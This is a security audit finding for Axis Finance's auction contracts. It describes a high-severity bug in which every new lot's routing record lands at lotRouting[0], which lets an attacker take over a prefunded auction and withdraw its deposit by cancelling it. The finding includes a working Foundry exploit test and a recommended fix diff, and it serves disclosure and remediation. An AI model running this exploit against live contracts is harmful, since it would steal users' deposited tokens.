# flacko - Malicious user can overtake a prefunded auction and steal the deposited funds

**Severity:** high
**Auditor:** Sherlock
**Protocol:** Axis Finance
**Keywords:** cybersecurity, vulnerability, auction, prefunded auction, malicious user, fund theft, lotRouting, lotId, storage variable, routing, attacker, honest user, cancellation, funding attribute, proof of concept, POC, base token, malicious auction, Foundry Forge, manual review

---

flacko

high

# Malicious user can overtake a prefunded auction and steal the deposited funds

## Summary
In the auction house whenever a new auction (lot) is created, its details are recorded at the 0th index in the \u0060lotRouting\u0060 mapping. This allows for an attacker to create an auction right after an honest user and take over their auction, allowing them to steal funds in the case of a prefunded auction.

## Vulnerability Detail
When a new auction is created via [AuctionHouse#auction()](https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/bases/Auctioneer.sol#L160-L164), it\u0027s routing details are recorded directly in storage at \u0060lotRouting[lotId]\u0060 where \u0060lotId\u0060 is the return value of the \u0060auction()\u0060 function itself. Since the return value is declared as a variable at the function signature level, it is initialized with the value of \u00600\u0060.

This means that when the \u0060routing\u0060 [storage variable is declared](https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/bases/Auctioneer.sol#L174) (\u0060Routing storage routing = lotRouting[lotId];\u0060) it will always point to \u0060lotRouting[0]\u0060 as the value of \u0060lotId\u0060 is set a bit later in the \u0060auction()\u0060 function to the correct index. This itself leads to the issue that an honest user can create a prefunded auction and an attacker can then come in, create a new auction themselves that is not prefunded and be immediately entitled to the honest user\u0027s prefunded funds by cancelling the auction they\u0027ve just created as they\u0027re set as the \u0060seller\u0060 of the lot at \u0060lotRouting[0]\u0060.

This attack is also possible because the \u0060funding\u0060 attribute of a lot is only set if an auction is specified to be prefunded in its parameters at creation.
## Impact
The following POC demonstrates how an attacker can overtake an honest user\u0027s auction and steal the funds they\u0027ve pre-deposited. The attacker only needs to ensure the base token of the malicious auction they are creating is the same as the one of the auction of the honest user. Once that\u0027s done, the attacker only needs to cancel the auction and the funds will be transferred to them.

To run the POC just create a file \u0060AuctionHouseTest.t.sol\u0060 somewhere under the \u0060./moonraker/test\u0060 directory, add \u0060src=/src/\u0060 to **remappings.txt** and run it using \u0060forge test --match-test test_overtake_auction_and_steal_prefunded_funds\u0060.

\u0060\u0060\u0060solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.19;

// Libraries
import {Test} from "forge-std/Test.sol";
import {ERC20} from \u0027solmate/tokens/ERC20.sol\u0027;

import \u0027src/modules/Modules.sol\u0027;
import {Auction} from \u0027src/modules/Auction.sol\u0027;

import {AuctionHouse} from \u0027src/AuctionHouse.sol\u0027;
import {FixedPriceAuctionModule} from \u0027src/modules/auctions/FPAM.sol\u0027;

contract AuctionHouseTest is Test {
  AuctionHouse public auctionHouse;
  FixedPriceAuctionModule public fixedPriceAuctionModule;

  address public OWNER = makeAddr(\u0027Owner\u0027);
  address public PROTOCOL = makeAddr(\u0027Protocol\u0027);
  address public PERMIT2 = makeAddr(\u0027Permit 2\u0027);

  MockERC20 public baseToken = new MockERC20("Base", "BASE", 18);
  MockERC20 public quoteToken = new MockERC20("Quote", "QUOTE", 18);

  function setUp() public {
    vm.warp(1710965574);
    auctionHouse = new AuctionHouse(OWNER, PROTOCOL, PERMIT2);
    fixedPriceAuctionModule = new FixedPriceAuctionModule(address(auctionHouse));

    vm.prank(OWNER);
    auctionHouse.installModule(fixedPriceAuctionModule);
  }

  function test_overtake_auction_and_steal_prefunded_funds() public {
    // Step 1
    uint256 PREFUNDED_AMOUNT = 1_000e18;
    address USER = makeAddr(\u0027User\u0027);
    vm.startPrank(USER);
    baseToken.mint(PREFUNDED_AMOUNT);
    baseToken.approve(address(auctionHouse), PREFUNDED_AMOUNT);

    AuctionHouse.RoutingParams memory routingParams;
    routingParams.auctionType = keycodeFromVeecode(fixedPriceAuctionModule.VEECODE());
    routingParams.baseToken = baseToken;
    routingParams.quoteToken = quoteToken;
    routingParams.prefunded = true;

    Auction.AuctionParams memory auctionParams;
    auctionParams.start = uint48(block.timestamp + 1 weeks);
    auctionParams.duration = 5 days;
    auctionParams.capacity = uint96(PREFUNDED_AMOUNT);
    auctionParams.implParams =
      abi.encode(FixedPriceAuctionModule.FixedPriceParams({price: 1e18, maxPayoutPercent: 100_000}));

    auctionHouse.auction(routingParams, auctionParams, "");

    // Step 2
    address ATTACKER = makeAddr(\u0027Attacker\u0027);
    vm.startPrank(ATTACKER);

    routingParams.prefunded = false;
    auctionHouse.auction(routingParams, auctionParams, "");
	
    // ATTACKER is now the seller of the lot at lotRouting[0]; the lot\u0027s funding remains the same
    auctionHouse.cancel(0, "");

    assertEq(baseToken.balanceOf(ATTACKER), PREFUNDED_AMOUNT);
    assertEq(baseToken.balanceOf(USER), 0);
  }
}

contract MockERC20 is ERC20 {
    constructor(
        string memory _name,
        string memory _symbol,
        uint8 _decimals
    ) ERC20(_name, _symbol, _decimals) {}

    function mint(uint256 amount) public {
      _mint(msg.sender, amount);
    }
}
\u0060\u0060\u0060
## Code Snippet
https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/bases/Auctioneer.sol#L160-L164
https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/bases/Auctioneer.sol#L174
https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/bases/Auctioneer.sol#L194
https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/bases/Auctioneer.sol#L211-L212
## Tool used
Manual Review
Foundry Forge

## Recommendation
\u0060\u0060\u0060diff
diff --git a/moonraker/src/bases/Auctioneer.sol b/moonraker/src/bases/Auctioneer.sol
index a77585b..48c39d5 100644
--- a/moonraker/src/bases/Auctioneer.sol
+++ b/moonraker/src/bases/Auctioneer.sol
@@ -171,6 +171,9 @@ abstract contract Auctioneer is WithModules, ReentrancyGuard {
             revert InvalidParams();
         }
 
+        // Increment lot count and get ID
+        lotId = lotCounter++;
+
         Routing storage routing = lotRouting[lotId];
 
         bool requiresPrefunding;
@@ -190,9 +193,6 @@ abstract contract Auctioneer is WithModules, ReentrancyGuard {
                     || baseTokenDecimals > 18 || quoteTokenDecimals < 6 || quoteTokenDecimals > 18
             ) revert InvalidParams();
 
-            // Increment lot count and get ID
-            lotId = lotCounter++;
-
             // Call module auction function to store implementation-specific data
             (lotCapacity) =
                 auctionModule.auction(lotId, params_, quoteTokenDecimals, baseTokenDecimals);
\u0060\u0060\u0060

